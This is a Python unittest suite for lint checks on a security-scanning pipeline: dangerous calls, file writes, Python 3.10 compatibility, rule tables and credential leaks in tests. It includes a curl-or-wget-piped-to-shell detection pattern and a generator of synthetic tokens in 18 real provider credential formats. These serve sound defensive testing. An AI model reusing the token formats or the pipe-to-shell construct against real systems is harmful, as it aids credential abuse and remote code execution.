    def test_flags_the_entry_point_and_the_scanners_too(self):
        for rel in ("scan_pipeline.py", "transit/scanners/shell.py", "transit/files.py"):
            with self.subTest(rel=rel):
                self.assertFlags(lint_dangerous_calls(tree_of(**{rel: "eval(x)\n"})), rel)

    def test_near_miss_things_that_only_look_dangerous(self):
        text = src('''
            """os.system(x) and eval(y) in a docstring."""
            import ast, subprocess
            def f(model, s, run):
                a = ast.literal_eval(s)
                b = model.eval(s)
                c = model.exec(s)
                d = subprocess.run(["ls"], shell=False)
                e = run(["ls"], shell=False)
                return a, b, c, d, e
            NOTE = "os.system('x')"
            def evaluate(x):
                return x
        ''')
        self.assertCleanLint(lint_dangerous_calls(tree_of(**{"transit/tools/__init__.py": text})))


class HelperImportTests(LintCase):
    def test_real_tree_never_imports_a_helper_program(self):
        self.assertCleanLint(lint_helper_imports(engine_tree()))

    def test_flags_every_way_of_importing_a_helper_program(self):
        samples = {
            "pdf": "import transit.containers.pdf\n",
            "pdf as": "import transit.containers.pdf as pdf\n",
            "from containers import jar": "from transit.containers import jar\n",
            "from containers.office import": "from transit.containers.office import x\n",
            "manifests": "from transit.scanners import manifests\n",
            "gitleaks": "from transit.tools import gitleaks\n",
            "scancode": "from transit.tools import scancode, other\n",
            "report_json": "from transit import report_json\n",
            "report_json module": "import transit.report_json\n",
            "relative sibling": "from . import manifests\n",
            "relative module": "from .manifests import x\n",
            "relative two up": "from ..containers import jar\n",
            "import_module": "import importlib\nimportlib.import_module('transit.containers.office')\n",
            "__import__": "__import__('transit.containers.jar')\n",
            "inside a function": "def f():\n    from transit.containers import pdf\n",
        }
        for name, text in samples.items():
            with self.subTest(name):
                self.assertFlags(lint_helper_imports(tree_of(**{"transit/scanners/shell.py": text})), "transit/scanners/shell.py")

    def test_flags_the_pdf_helper_from_anywhere(self):
        """``transit.containers.pdf`` raises ``SystemExit(0)`` when imported: an engine that imported it would end with status 0."""
        for rel in ("transit/layers.py", "transit/tools/__init__.py", "scan_pipeline.py", "transit/scanners/__init__.py"):
            with self.subTest(rel=rel):
                self.assertFlags(lint_helper_imports(tree_of(**{rel: "from transit.containers import pdf\n"})), rel)

    def test_near_miss_what_is_not_a_helper(self):
        text = src('''
            from transit.containers import something_else
            from transit.scanners import ScanContext, ScannerSpec
            from transit.tools import ToolLocator
            from transit import rx
            SCRIPT_MODULES = frozenset({"manifests"})
            HELPER = {"jar": "containers/jar.py"}
            NAME = "transit.containers.jar"
        ''')
        self.assertCleanLint(lint_helper_imports(tree_of(**{"transit/scanners/__init__.py": text, "transit/containers/something_else.py": ""})))

    def test_near_miss_a_helper_program_may_import_what_it_likes(self):
        self.assertCleanLint(lint_helper_imports(tree_of(**{"transit/containers/office.py": "from transit.containers import jar\n"})))


class BufferSplittingTests(LintCase):
    def test_real_tree_never_materialises_the_lines_of_a_buffer(self):
        self.assertCleanLint(lint_buffer_splitting(engine_tree()))

    def test_flags_each_construct_in_each_scoped_file(self):
        samples = {
            "rx.after_context": "from transit import rx\nrx.after_context(c, d, 5)\n",
            "alias of rx": "from transit import rx as _rx\n_rx.after_context(c, d, 5)\n",
            "dotted": "import transit.rx\ntransit.rx.after_context(c, d, 5)\n",
            "bare import": "from transit.rx import after_context\nafter_context(c, d, 5)\n",
            "rx.lines_over": "from transit import rx\nrx.lines_over(d, 9)\n",
            "bare lines_over": "from transit.rx import lines_over\nlines_over(d, 9)\n",
            "split bytes": "def f(d):\n    return d.split(b'\\n')\n",
            "split bytes hex": "def f(d):\n    return d.split(b'\\x0a')\n",
            "split text": "def f(t):\n    return t.split('\\n')\n",
            "splitlines": "def f(d):\n    return d.splitlines()\n",
            "splitlines keepends": "def f(d):\n    return d.splitlines(True)\n",
            "readlines": "import io\ndef f(d):\n    return io.BytesIO(d).readlines()\n",
        }
        for rel in ("transit/files.py", "transit/rules/__init__.py", "transit/scanners/universal.py", "transit/scanners/credentials.py"):
            for name, text in samples.items():
                with self.subTest(rel=rel, name=name):
                    self.assertFlags(lint_buffer_splitting(tree_of(**{rel: text})), rel)

    def test_near_miss_a_bounded_split_and_other_separators(self):
        text = src('''
            def first_line(d):
                return d.split(b"\\n", 1)[0]
            def parts(name):
                return name.split("/"), name.split(b","), name.split(), name.rsplit(b"\\n", 1)
            def words(t):
                return t.partition("\\n")
            """d.splitlines() and d.split(b"\\n") in a docstring"""
        ''')
        self.assertCleanLint(lint_buffer_splitting(tree_of(**{"transit/files.py": text})))

    def test_near_miss_modules_outside_the_scope_may_split(self):
        text = "def f(d):\n    return d.splitlines(), d.split(b'\\n')\n"
        for rel in ("transit/report.py", "transit/scanners/doc.py", "transit/layers.py", "transit/console.py"):
            with self.subTest(rel=rel):
                self.assertCleanLint(lint_buffer_splitting(tree_of(**{rel: text})))


class ModuleStateTests(LintCase):
    def test_real_tree_has_no_module_level_mutable_state_in_a_scanner(self):
        self.assertCleanLint(lint_module_state(engine_tree()))

    def test_flags_each_kind_of_module_state(self):
        samples = {
            "list literal": "SEEN = []\n",
            "dict literal": "CACHE = {}\n",
            "set literal": "ROWS = {1, 2}\n",
            "list of a flag (PS_FAILED)": "PS_FAILED = [False]\n",
            "list()": "X = list()\n",
            "dict()": "X = dict(a=1)\n",
            "set()": "X = set()\n",
            "bytearray": "X = bytearray(4)\n",
            "collections.defaultdict": "import collections\nX = collections.defaultdict(list)\n",
            "deque": "from collections import deque\nX = deque()\n",
            "OrderedDict": "import collections as c\nX = c.OrderedDict()\n",
            "Counter": "from collections import Counter\nX = Counter()\n",
            "comprehension": "X = {k: 1 for k in 'ab'}\n",
            "list comprehension": "X = [k for k in 'ab']\n",
            "annotated": "X: 'list[int]' = []\n",
            "inside an if": "import sys\nif sys.platform:\n    X = []\n",
            "inside a try": "try:\n    X = {}\nexcept ImportError:\n    X = None\n",
            "class attribute": "class Holder:\n    seen = []\n",
            "global statement": "STATE = None\ndef scan(ctx):\n    global STATE\n    STATE = ctx\n",
            "lru_cache": "import functools\n@functools.lru_cache(maxsize=None)\ndef f(x):\n    return x\n",
            "lru_cache bare": "from functools import lru_cache\n@lru_cache\ndef f(x):\n    return x\n",
            "functools.cache": "import functools\n@functools.cache\ndef f(x):\n    return x\n",
            "cached_property": "import functools\nclass A:\n    @functools.cached_property\n    def f(self):\n        return 1\n",
        }
        for name, text in samples.items():
            with self.subTest(name):
                self.assertFlags(lint_module_state(tree_of(**{"transit/scanners/powershell.py": text})), "transit/scanners/powershell.py")

    def test_near_miss_a_constant_table_annotated_as_read_only(self):
        """``KNOWN_SCANNERS: Mapping[str, str] = {...}`` is the fixed registry table of the real ``transit/scanners/__init__.py``; the
        annotation says nobody writes to it. The same literal with no such annotation, or annotated ``dict``, is state."""
        text = 'from typing import Final, Mapping, Sequence\nA: Mapping[str, str] = {"a": "b"}\nB: "Mapping[str, str]" = {"a": "b"}\nC: Final = ["x"]\nD: Sequence[str] = ["x"]\n'
        self.assertCleanLint(lint_module_state(tree_of(**{"transit/scanners/__init__.py": text})))
        self.assertFlags(lint_module_state(tree_of(**{"transit/scanners/__init__.py": "A = {'a': 'b'}\nB: dict = {}\nC: 'list[str]' = ['x']\n"})))

    def test_flags_the_registry_module_as_well(self):
        self.assertFlags(lint_module_state(tree_of(**{"transit/scanners/__init__.py": "_NOTED = set()\n"})), "transit/scanners/__init__.py")

    def test_near_miss_immutable_module_constants(self):
        text = src('''
            """The shapes of a scanner module as the stubs have them."""
            from __future__ import annotations
            import dataclasses, types
            from typing import Mapping
            RULES: "RuleSet | None" = None
            NAMES = ("a", "b")
            FLAGS = frozenset({"a", "b"})
            TABLE: Mapping[str, str] = types.MappingProxyType({"a": "b"})
            SCANNERS = (ScannerSpec(id="python", family="python", fn=scan, ported=False),)
            __all__ = ["scan"]
            LIMIT = 8192
            PATTERN = "a|b"
            @dataclasses.dataclass(frozen=True)
            class Row:
                names: tuple = ()
                extra: list = dataclasses.field(default_factory=list)
            def scan(ctx):
                seen = []
                table = {}
                for x in (1, 2):
                    seen.append(x)
                return seen, table
        ''')
        self.assertCleanLint(lint_module_state(tree_of(**{"transit/scanners/shell.py": text})))

    def test_near_miss_modules_that_are_not_scanners_may_keep_state(self):
        """``rx`` and ``rules`` keep the registry of compiled patterns, ``files`` and ``verdict`` have their own objects."""
        for rel in ("transit/rx.py", "transit/rules/__init__.py", "transit/files.py", "transit/verdict.py", "transit/tools/__init__.py"):
            with self.subTest(rel=rel):
                self.assertCleanLint(lint_module_state(tree_of(**{rel: "_REGISTRY = {}\n_IDS = set()\ndef f():\n    global _IDS\n"})))

    def test_near_miss_the_manifests_program_is_not_a_scanner_module(self):
        self.assertCleanLint(lint_module_state(tree_of(**{"transit/scanners/manifests.py": "FACTS = []\n"})))


class RegexInFunctionTests(LintCase):
    def test_real_tree_compiles_no_regex_inside_a_function(self):
        self.assertCleanLint(lint_regex_in_function(engine_tree()))

    def test_flags_each_construction_inside_a_function(self):
        samples = {
            "Match in a function": "from transit.rules import Match\ndef scan(ctx):\n    return ctx.search(Match('a|b'))\n",
            "Match via the module": "from transit import rules\ndef scan(ctx):\n    return ctx.search(rules.Match('a|b'))\n",
            "Match via an alias": "from transit import rules as _r\ndef scan(ctx):\n    return _r.Match('a')\n",
            "Matcher in a function": "from transit.rules import Match, Matcher\ndef f():\n    return Matcher('x/y', Match('a'))\n",
            "RuleSet in a function": "from transit.rules import RuleSet\ndef f(rows):\n    return RuleSet('x', rows)\n",
            "rx.ere_to_py": "from transit import rx\ndef f(p):\n    return rx.ere_to_py(p)\n",
            "rx.rule": "from transit import rx\ndef f(p):\n    return rx.rule('x', p)\n",
            "bare ere_to_py": "from transit.rx import ere_to_py\ndef f(p):\n    return ere_to_py(p)\n",
            "in a lambda": "from transit.rules import Match\nbuild = lambda p: Match(p)\n",
            "in a method": "from transit.rules import Match\nclass C:\n    def f(self, p):\n        return Match(p)\n",
            "in a nested function": "from transit.rules import Match\ndef f():\n    def g(p):\n        return Match(p)\n    return g\n",
        }
        for name, text in samples.items():
            with self.subTest(name):
                self.assertFlags(lint_regex_in_function(tree_of(**{"transit/scanners/python_lang.py": text})), "transit/scanners/python_lang.py")

    def test_flags_the_other_engine_modules_too(self):
        text = "from transit import rx\ndef f(p):\n    return rx.ere_to_py(p)\n"
        for rel in ("transit/layers.py", "transit/files.py", "transit/scanners/universal.py", "transit/scanners/__init__.py"):
            with self.subTest(rel=rel):
                self.assertFlags(lint_regex_in_function(tree_of(**{rel: text})), rel)

    def test_near_miss_module_level_and_class_level_tables_are_the_way(self):
        text = src('''
            from transit.rules import Match, Matcher, RuleSet, RuleSpec
            KEY = Matcher("universal/key-header", Match("-----BEGIN"))
            RULES = RuleSet("python", (RuleSpec(id="python/01-x", outcome="fail", message="CWE-78:x", cond=Match("os\\\\.system")),))
            class Holder:
                MATCH = Match("a|b")
            def scan(ctx):
                return ctx.search(KEY)
        ''')
        self.assertCleanLint(lint_regex_in_function(tree_of(**{"transit/scanners/python_lang.py": text})))

    def test_near_miss_the_machinery_itself_constructs_matches_in_functions(self):
        text = "from transit import rx\ndef _register(p):\n    return rx.rule('x', p)\ndef f(p):\n    return rx.ere_to_py(p)\n"
        self.assertCleanLint(lint_regex_in_function(tree_of(**{"transit/rx.py": text, "transit/rules/__init__.py": text})))

    def test_near_miss_calling_a_search_function_is_not_compiling(self):
        text = "from transit import rx\ndef f(c, d):\n    return rx.search_lines(c, d), rx.dfa_search(c, d), rx.only_matching(c, d)\n"
        self.assertCleanLint(lint_regex_in_function(tree_of(**{"transit/scanners/credentials.py": text})))


class WriteTests(LintCase):
    """S14. An approximation, and said to be one: it finds the calls that write, not a write made through an object it cannot see.
    A scanner has no write API (``ScanContext``); the work directory, the temporary area, the reports and the sidecars belong to
    ``files``, ``report``, ``pipeline`` and ``layers``; a tool wrapper may write what its tool needs into the temporary area."""

    def test_real_tree_writes_only_where_it_may(self):
        self.assertCleanLint(lint_writes(engine_tree()))

    def test_flags_each_write(self):
        samples = {
            "open w": "def f(p):\n    return open(p, 'w')\n",
            "open wb": "def f(p):\n    return open(p, 'wb')\n",
            "open a": "def f(p):\n    return open(p, 'ab')\n",
            "open x": "def f(p):\n    return open(p, 'x')\n",
            "open r+": "def f(p):\n    return open(p, 'r+b')\n",
            "open mode keyword": "def f(p):\n    return open(p, mode='w')\n",
            "open mode variable": "def f(p, m):\n    return open(p, m)\n",
            "io.open": "import io\ndef f(p):\n    return io.open(p, 'w')\n",
            "os.open for writing": "import os\ndef f(p):\n    return os.open(p, os.O_WRONLY | os.O_CREAT)\n",
            "os.open rdwr": "import os\ndef f(p):\n    return os.open(p, os.O_RDWR)\n",
            "os.open with a variable": "import os\ndef f(p, fl):\n    return os.open(p, fl)\n",
            "os.remove": "import os\nos.remove('x')\n",
            "os.unlink": "import os\nos.unlink('x')\n",
            "os.rename": "import os\nos.rename('x', 'y')\n",
            "os.replace": "import os\nos.replace('x', 'y')\n",
            "os.rmdir": "import os\nos.rmdir('x')\n",
            "os.mkdir": "import os\nos.mkdir('x')\n",
            "os.makedirs": "import os\nos.makedirs('x')\n",
            "os.chmod": "import os\nos.chmod('x', 0)\n",
            "os.symlink": "import os\nos.symlink('x', 'y')\n",
            "os.truncate": "import os\nos.truncate('x', 0)\n",
            "os.utime": "import os\nos.utime('x')\n",
            "from os import remove": "from os import remove\nremove('x')\n",
            "shutil.rmtree": "import shutil\nshutil.rmtree('x')\n",
            "shutil.copy": "import shutil\nshutil.copy('x', 'y')\n",
            "shutil.move": "import shutil\nshutil.move('x', 'y')\n",
            "tempfile.mkstemp": "import tempfile\ntempfile.mkstemp()\n",
            "tempfile.NamedTemporaryFile": "import tempfile\ntempfile.NamedTemporaryFile()\n",
            "Path.write_text": "from pathlib import Path\nPath('x').write_text('y')\n",
            "write_bytes on a name": "def f(p):\n    p.write_bytes(b'x')\n",
            "Path.touch": "def f(p):\n    p.touch()\n",
            "Path.mkdir": "def f(p):\n    p.mkdir()\n",
            "Path.unlink": "def f(p):\n    p.unlink()\n",
            "Path.symlink_to": "def f(p, q):\n    p.symlink_to(q)\n",
        }
        for name, text in samples.items():
            with self.subTest(name):
                self.assertFlags(lint_writes(tree_of(**{"transit/scanners/doc.py": text})), "transit/scanners/doc.py")

    def test_flags_every_module_that_has_no_business_writing(self):
        for rel in ("transit/dispatch.py", "transit/findings.py", "transit/verdict.py", "transit/cli.py", "transit/config.py",
                    "transit/console.py", "transit/rules/__init__.py", "transit/scanners/__init__.py", "transit/scanners/universal.py"):
            with self.subTest(rel=rel):
                self.assertFlags(lint_writes(tree_of(**{rel: "import os\nos.remove('x')\n"})), rel)

    def test_near_miss_a_stream_pointed_at_dev_null_is_not_the_scanned_directory(self):
        text = "import os\ndef quiet(fd):\n    null = os.open(os.devnull, os.O_WRONLY)\n    os.dup2(null, fd)\n    open('/dev/null', 'w')\n"
        self.assertCleanLint(lint_writes(tree_of(**{"transit/console.py": text})))

    def test_near_miss_reading_is_not_writing(self):
        text = src('''
            import os, stat
            from pathlib import Path
            def f(p, ctx):
                a = open(p)
                b = open(p, "rb")
                c = open(p, mode="r")
                d = os.open(p, os.O_RDONLY | os.O_NOFOLLOW | os.O_CLOEXEC)
                e = os.stat(p), os.lstat(p), os.listdir(p), os.path.join(p, "x"), os.path.exists(p)
                g = Path(p).read_bytes(), Path(p).read_text(), Path(p).is_file()
                h = ctx.temp.new_file(".txt")
                return a, b, c, d, e, g, h
            def replace(s):
                return s.replace("a", "b")
        ''')
        self.assertCleanLint(lint_writes(tree_of(**{"transit/scanners/doc.py": text})))

    def test_near_miss_the_writers(self):
        text = "import os, shutil\ndef f(p):\n    os.remove(p)\n    shutil.rmtree(p)\n    return open(p, 'wb')\n"
        for rel in ("transit/files.py", "transit/report.py", "transit/pipeline.py", "transit/layers.py", "transit/tools/__init__.py",
                    "transit/tools/gitleaks_wrapper.py"):
            with self.subTest(rel=rel):
                self.assertCleanLint(lint_writes(tree_of(**{rel: text})))

    def test_near_miss_the_helper_programs_are_not_the_engine(self):
        self.assertCleanLint(lint_writes(tree_of(**{"transit/containers/jar.py": "open('x', 'w')\n", "transit/scanners/manifests.py": "open('x', 'w')\n"})))

# ═══════════════════════════════════════════════════════════════════════════════════════════════
# 2. Python 3.10 is the floor
# ═══════════════════════════════════════════════════════════════════════════════════════════════
class FloorTests(LintCase):
    """Hard rule: nothing from 3.11 or later (``tomllib``, ``ExceptionGroup``, ``except*``, ``typing.Self``, ``StrEnum``, ``datetime.UTC``,
    ``asyncio.TaskGroup``, a ``|`` union in a runtime ``isinstance``), and no f-string form of 3.12 (a reused quote, a backslash or a comment
    inside the braces). ``ast.parse(feature_version=(3, 10))`` finds the syntax of 3.11 and 3.12 but not PEP 701 f-strings, so those are
    read from the token stream on a 3.12+ interpreter; a 3.10 or 3.11 interpreter rejects them in the parser."""

    def test_real_tree_and_tests_run_on_the_floor(self):
        self.assertCleanLint(lint_floor({**load_sources(), **load_test_sources()}))

    def test_flags_syntax_newer_than_the_floor(self):
        samples = {
            "except*": "try:\n    pass\nexcept* ValueError:\n    pass\n",
            "type parameters": "def f[T](x: T) -> T:\n    return x\n",
            "type statement": "type Alias = int\n",
            "class type parameters": "class Box[T]:\n    pass\n",
        }
        for name, text in samples.items():
            with self.subTest(name):
                self.assertFlags(lint_floor({"transit/x.py": text}), "does not parse")

    def test_flags_each_name_newer_than_the_floor(self):
        samples = {
            "tomllib": ("import tomllib\n", "tomllib"),
            "tomllib from": ("from tomllib import loads\n", "tomllib"),
            "typing.Self": ("from typing import Self\n", "Self"),
            "typing.Self attribute": ("import typing\nX = typing.Self\n", "Self"),
            "typing.override": ("from typing import override\n", "override"),
            "typing.LiteralString": ("from typing import LiteralString\n", "LiteralString"),
            "StrEnum": ("from enum import StrEnum\n", "StrEnum"),
            "enum.StrEnum": ("import enum\nclass A(enum.StrEnum):\n    pass\n", "StrEnum"),
            "datetime.UTC": ("import datetime\nX = datetime.UTC\n", "UTC"),
            "from datetime import UTC": ("from datetime import UTC\n", "UTC"),
            "datetime.datetime.UTC via alias": ("import datetime as dt\nX = dt.UTC\n", "UTC"),
            "asyncio.TaskGroup": ("import asyncio\nX = asyncio.TaskGroup()\n", "TaskGroup"),
            "asyncio.timeout": ("import asyncio\nX = asyncio.timeout(1)\n", "timeout"),
            "ExceptionGroup": ("raise ExceptionGroup('x', [ValueError()])\n", "ExceptionGroup"),
            "BaseExceptionGroup": ("X = BaseExceptionGroup\n", "BaseExceptionGroup"),
            "contextlib.chdir": ("import contextlib\nX = contextlib.chdir('.')\n", "chdir"),
            "hashlib.file_digest": ("import hashlib\nX = hashlib.file_digest(f, 'sha256')\n", "file_digest"),
            "itertools.batched": ("import itertools\nX = itertools.batched(a, 2)\n", "batched"),
            "math.cbrt": ("import math\nX = math.cbrt(8)\n", "cbrt"),
            "sys.exception": ("import sys\nX = sys.exception()\n", "exception"),
            "shutil onexc": ("import shutil\nshutil.rmtree(p, onexc=f)\n", "onexc"),
            "star in a subscript": ("X = a[*b]\n", "subscript"),
        }
        for name, (text, needle) in samples.items():
            with self.subTest(name):
                self.assertFlags(lint_floor({"transit/x.py": text}), needle)

    def test_flags_a_union_in_a_runtime_isinstance(self):
        for text in ("isinstance(x, int | None)\n", "issubclass(c, A | B)\n", "def f(x):\n    return isinstance(x, str | bytes)\n"):
            with self.subTest(text=text):
                self.assertFlags(lint_floor({"transit/x.py": text}), "union")

    def test_flags_the_f_string_forms_of_3_12(self):
        samples = {
            "a reused double quote": 'x = f"{d["k"]}"\n',
            "a reused single quote": "x = f'{d['k']}'\n",
            "a backslash in the braces": "x = f\"{'\\n'.join(a)}\"\n",
            "a comment in the braces": 'x = f"""{a  # c\n}"""\n',
            "a nested f-string with the same quote": 'x = f"{f"{a}"}"\n',
        }
        for name, text in samples.items():
            with self.subTest(name):
                self.assertFlags(lint_floor({"transit/x.py": text}))

    def test_near_miss_what_the_floor_allows(self):
        text = src('''
            from __future__ import annotations
            import dataclasses, datetime, enum, sys
            from typing import Optional
            class Mode(str, enum.Enum):
                A = "a"
            @dataclasses.dataclass(frozen=True)
            class Row:
                name: str | None = None
                values: "list[int] | None" = None
            def f(x: int | None = None, /, *, y: "str | bytes" = b"") -> "tuple[int, ...]":
                match x:
                    case 1:
                        pass
                    case _:
                        pass
                if (n := len(y)) > 1:
                    pass
                with (open("a") as one, open("b") as two):
                    pass
                return (n,)
            def g(x):
                a = isinstance(x, (int, type(None)))
                b = datetime.timezone.utc
                c = f"{x['k']}", f'{x["k"]}', f"{x!r:>10}", f"{{literal}}", f"{f'{x}'}", f"{x:{10}}", f"{x = }"
                d = "\\n".join(["a"]) + f"{'a'}"
                return a, b, c, d, sys.exc_info()
        ''')
        self.assertCleanLint(lint_floor({"transit/x.py": text}))

    def test_a_file_that_is_not_utf8_python_is_reported_not_skipped(self):
        self.assertFlags(lint_floor({"transit/x.py": "x = (\n"}), "does not parse")


# ═══════════════════════════════════════════════════════════════════════════════════════════════
# 3. no contiguous credential token in the tests
# ═══════════════════════════════════════════════════════════════════════════════════════════════
_ALNUM = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
_UPPER_DIGITS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
_EXT = _ALNUM + "_-"
_HEX = "0123456789abcdef"


def body(length: int, alphabet: str) -> str:
    """A body of the given length that cannot contain a placeholder: it steps through the alphabet by 7, so there is no run of one character,
    no ``abcdefgh`` and no ``1234567890``."""
    return "".join(alphabet[(i * 7 + 3) % len(alphabet)] for i in range(length))


def provider_tokens() -> "dict[str, str]":
    """One token of each of the 18 formats of Layer 4, assembled from two halves at run time (this file never holds one)."""
    return {
        "aws_access_key_id": "AKIA" + body(16, _UPPER_DIGITS),
        "aws_secret_access_key": "aws_secret_" + "access_key = '" + body(40, _ALNUM + "/+"),
        "github_token": "gh" + "p_" + body(36, _ALNUM),
        "github_fine_grained_pat": "github_" + "pat_" + body(60, _ALNUM + "_"),
        "gitlab_pat": "glpat" + "-" + body(24, _EXT),
        "stripe_live_key": "sk_" + "live_" + body(26, _ALNUM),
        "slack_token": "xo" + "xb-" + "304958172635-815926403917-" + body(24, _ALNUM),
        "google_api_key": "AI" + "za" + body(35, _EXT),
        "google_oauth_token": "ya" + "29." + body(34, _EXT),
        "sendgrid_key": "SG" + "." + body(22, _EXT) + "." + body(43, _EXT),
        "npm_token": "npm" + "_" + body(36, _ALNUM),
        "pypi_token": "pypi-" + "AgEIcHlwaS5vcmc" + body(54, _EXT),
        "huggingface_token": "hf" + "_" + body(36, _ALNUM),
        "anthropic_key": "sk-" + "ant-api03-" + body(70, _EXT),
        "openai_project_key": "sk-" + "proj-" + body(48, _EXT),
        "openai_legacy_key": "sk" + "-" + body(48, _ALNUM),
        "shopify_token": "shp" + "at_" + body(32, _HEX),
        "digitalocean_token": "dop" + "_v1_" + body(64, _HEX),
    }


def pem_header() -> str:
    return "-----BEGIN " + "RSA PRIVATE KEY-----"


class TokenTests(LintCase):
    def test_real_tests_hold_no_contiguous_token(self):
        self.assertCleanLint(lint_tokens(load_test_sources()))

    def test_the_sample_tokens_are_what_the_pipeline_calls_a_token(self):
        self.assertEqual(18, len(provider_tokens()))

    def test_flags_each_of_the_18_formats(self):
        for name, token in provider_tokens().items():
            with self.subTest(name):
                problems = lint_tokens({"tests/engine/test_x.py": "VALUE = '%s'\n" % token})
                self.assertFlags(problems, "tests/engine/test_x.py:1")

    def test_flags_a_token_in_an_unquoted_assignment_and_in_a_comment(self):
        token = provider_tokens()["github_token"]
        for text in ("export GITHUB_TOKEN=%s\n" % token, "# leaked: %s\n" % token, "url = 'https://x:%s@host/'\n" % token):
            with self.subTest(text=text[:20]):
                self.assertFlags(lint_tokens({"tests/engine/test_x.py": text}))

    def test_flags_a_pem_private_key_with_a_body(self):
        text = pem_header() + "\n" + body(64, _ALNUM + "+/") + "\n-----END " + "RSA PRIVATE KEY-----\n"
        self.assertFlags(lint_tokens({"tests/engine/test_x.py": text}), "private key")

    def test_flags_a_pem_key_whose_body_is_on_the_fifth_line_and_one_that_is_wrapped_and_folded(self):
        text = pem_header() + "\n\n\n\n" + body(64, _ALNUM + "+/") + "\n"
        self.assertFlags(lint_tokens({"tests/engine/test_x.py": text}), "private key")

    def test_near_miss_placeholders_the_pipeline_excludes(self):
        t = provider_tokens()
        samples = {
            "the AWS documentation key": "AKIA" + "IOSFODNN7" + "EXAMPLE",
            "a body of one repeated character": "gh" + "p_" + "a" * 36,
            "a body with the word SAMPLE": "sk_" + "live_" + "SAMPLE" + body(20, _ALNUM),
            "a body of zeros": "shp" + "at_" + "0" * 32,
            "the GitHub documentation token": "gh" + "p_16C7e42F" + "292c6912E7710c838347Ae178B4a",
            "a Stripe test key": "sk_" + "test_" + body(26, _ALNUM),
            "a token inside a longer identifier": "Z" + t["npm_token"] + "Z",
            "a token inside a base64 blob": "QUJD" + t["aws_access_key_id"] + "REVG",
            "a git sha": "d" * 3 + "e3b0c44298fc1c149afbf4c8996fb92427ae41e4",
            "a short body": "gh" + "p_" + body(20, _ALNUM),
        }
        for name, token in samples.items():
            with self.subTest(name):
                self.assertCleanLint(lint_tokens({"tests/engine/test_x.py": "VALUE = '%s'\n" % token}))

    def test_near_miss_a_pem_header_without_a_body(self):
        for text in (pem_header() + "\nXXXX\nXXXX\n-----END " + "RSA PRIVATE KEY-----\n",
                     "magic=\"" + pem_header() + "\"\n", "# the " + pem_header() + " is a signature\n",
                     pem_header() + "\n" + "\n" * 6 + body(64, _ALNUM + "+/") + "\n",
                     "-----BEGIN " + "CERTIFICATE-----\n" + body(64, _ALNUM + "+/") + "\n"):
            with self.subTest(text=text[:30]):
                self.assertCleanLint(lint_tokens({"tests/engine/test_x.py": text}))

    def test_near_miss_a_credential_name_with_an_ordinary_value(self):
        self.assertCleanLint(lint_tokens({"tests/engine/test_x.py": "password = 'hunter2'\nAWS_KEY = 'AKIA...'\nKEY = 'sk-ant-api03-'\n"}))


# ═══════════════════════════════════════════════════════════════════════════════════════════════
# 4. rule tables: messages and patterns come from the bash script
# ═══════════════════════════════════════════════════════════════════════════════════════════════
class RuleTableTests(LintCase):
    SCRIPT = 'record_fail "$f" "CWE-78:OS_command_injection_risk"\nrecord_warn "$f" "CWE-601:potential_open_redirect"\n'

    def test_flags_a_message_that_bash_never_says(self):
        rows = [("python", "python/01-x", "fail", "CWE-78:OS_command_injection_risk"),
                ("python", "python/02-y", "fail", "CWE-78:OS_command_injection_RISK")]
        problems = lint_messages(rows, self.SCRIPT)
        self.assertFlags(problems, "python/02-y", "CWE-78:OS_command_injection_RISK")
        self.assertNotIn("python/01-x", "\n".join(problems))

    def test_flags_an_empty_message_and_a_non_string(self):
        self.assertFlags(lint_messages([("python", "python/01-x", "fail", "")], self.SCRIPT), "python/01-x")

    def test_near_miss_messages_that_occur_in_the_script(self):
        rows = [("python", "python/01-x", "fail", "CWE-78:OS_command_injection_risk"),
                ("python", "python/05-y", "warn", "CWE-601:potential_open_redirect")]
        self.assertCleanLint(lint_messages(rows, self.SCRIPT))

    def test_near_miss_no_rows_no_problem(self):
        """The stubs hold no rule table yet: the lint is vacuously clean until a package fills one in."""
        self.assertCleanLint(lint_messages([], self.SCRIPT))

    def test_real_rule_tables_use_the_messages_of_scan_pipeline_sh(self):
        report = import_report(sys.executable)
        script = (ROOT / "scan_pipeline.sh").read_text(encoding="utf-8")
        self.assertCleanLint(lint_messages(report["rulesets"], script))

    # --- patterns -----------------------------------------------------------------------------------------------------------
    KNOWN = ["^[[:space:]]*(curl|wget)[^|]*\\|[[:space:]]*(ba)?sh", "(^|[^A-Za-z0-9])(npm_[A-Za-z0-9]{36})([^A-Za-z0-9]|$)|other"]

    def test_flags_a_pattern_that_patterns_json_does_not_hold(self):
        problems = lint_patterns([("python/01-x", "os\\.system", "line", None)], self.KNOWN)
        self.assertFlags(problems, "python/01-x", "os\\\\.system")

    def test_flags_an_exclusion_that_patterns_json_does_not_hold(self):
        problems = lint_patterns([("xml/03-y", "curl[^|]*\\|", "excl", "never written in bash")], self.KNOWN)
        self.assertFlags(problems, "xml/03-y", "never written in bash")

    def test_near_miss_a_known_pattern_or_a_part_of_one(self):
        rows = [("shell/01-a", "(curl|wget)[^|]*\\|[[:space:]]*(ba)?sh", "line", None),
                ("credentials/npm", "npm_[A-Za-z0-9]{36}", "line", None)]
        self.assertCleanLint(lint_patterns(rows, self.KNOWN))

    def test_real_registered_patterns_occur_in_patterns_json(self):
        report = import_report(sys.executable)
        raw = json.loads((ROOT / "tests" / "conformance" / "patterns.json").read_text(encoding="utf-8"))
        known = sorted({str(entry[key]) for entry in raw for key in ("pattern", "pattern_text", "excl", "excl_text") if entry.get(key)})
        self.assertGreater(len(known), 200)
        self.assertCleanLint(lint_patterns(report["rules"], known))


# ═══════════════════════════════════════════════════════════════════════════════════════════════
# 5. S14: the scanned directory is read-only  (see WriteTests above)
# 6. packaging: the engine reaches the image, the offline bundle, the manifest and CI
# ═══════════════════════════════════════════════════════════════════════════════════════════════
DOCKERFILE = src("""
    COPY --from=builder /usr/local/bin/gitleaks /usr/local/bin/gitleaks
    WORKDIR /app
    COPY fetch_repo.sh scan_pipeline.sh scan_pipeline.py ai_transit.sh prepare_offline_cache.sh \\
         generate_excel_report.py selfcheck.py ./
    COPY transit ./transit
    RUN chmod +x *.sh
""")
OFFLINE = src("""
    for f in ai_transit.sh fetch_repo.sh scan_pipeline.sh scan_pipeline.py docker-run.sh \\
             generate_excel_report.py selfcheck.py \\
             Dockerfile INSTALL.md; do
        [[ -f "$f" ]] && cp "$f" "${BUNDLE}/pipeline/" 2>/dev/null || true
    done
    [[ -d transit ]] && cp -r transit "${BUNDLE}/pipeline/" 2>/dev/null || true
""")
